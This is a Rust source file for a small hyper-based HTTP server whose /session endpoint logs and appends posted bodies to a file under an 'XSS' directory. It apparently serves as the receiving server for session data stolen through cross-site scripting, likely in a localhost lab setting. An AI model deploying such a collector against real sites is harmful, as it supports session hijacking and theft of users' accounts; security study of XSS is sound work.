use std::convert::Infallible;
use std::fs::OpenOptions;
use std::io::Write;
use http_body_util::{BodyExt, Full};
use hyper_util::rt::TokioIo;
use tokio::net::TcpListener;
use hyper::{body::Bytes, server::conn::http1};
use hyper::service::service_fn;
use hyper::{Request, Response};

const SESS_PATH : &str = "./SSL/WebServer/XSS/session.txt";

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("127.0.0.1:8080").await?;
    loop {
        match listener.accept().await {
            Ok((mut stream, _)) => {
                tokio::spawn(async move {
                    let stream = TokioIo::new(&mut stream);
                    let conn = http1::Builder::new().serve_connection(stream, service_fn(handle));
                    if let Err(err) = conn.await {
                        eprintln!("Error serving connection: {}", err);
                        return ;
                    }
                });
            }
            Err(err) => {
                eprintln!("Error accepting connection: {}", err);
                return Err(err.into());
            }
        }
    }
}

async fn handle(request: Request<hyper::body::Incoming>) -> Result<Response<Full<Bytes>>, Infallible> {
    match request.uri().path() {
        "/session" => {
            let body = request.into_body().frame().await.unwrap().unwrap().into_data().unwrap();
            let body = String::from_utf8_lossy(&body);
            println!("Session: {}", body);
            let file_path = SESS_PATH;
            append_file(&file_path, &body).unwrap();
            
            Ok(Response::new(Full::from(Bytes::from_static(b"Session saved!"))))
        }
        _ => Ok(Response::new(Full::from(Bytes::from_static(b"Hello, World!")))),
    }
}

fn append_file(path: &str, content: &str) -> Result<(), std::io::Error> {
    let mut file = OpenOptions::new().create(true).append(true).open(path)?;
    file.write(content.as_bytes())?;
    file.write(b"\n")?;
    Ok(())
}